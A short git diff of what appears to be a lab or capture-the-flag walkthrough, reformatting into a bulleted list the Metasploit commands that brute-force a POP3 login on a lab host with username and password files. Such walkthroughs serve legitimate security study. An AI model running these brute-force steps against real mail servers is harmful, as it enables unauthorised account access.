@@ -31,12 +31,12 @@ Access the web server running on port 80 by visiting **htpp://<target_IP>** in t
 
 - Use Metasploit module for brute forcing the POP3 service: 
 
-msfconsole
-use auxiliary/scanner/pop3/pop3_login
-set RHOSTS 10.10.110.111
-set USER_FILE username.txt
-set PASS_FILE password.txt
-exploit
+  - msfconsole
+  - use auxiliary/scanner/pop3/pop3_login
+  - set RHOSTS 10.10.110.111
+  - set USER_FILE username.txt
+  - set PASS_FILE password.txt
+  - exploit
 
 ![set options in metasploit](https://github.com/user-attachments/assets/ecf9f1c0-aacf-4024-a540-1dfd6e234e04)
 
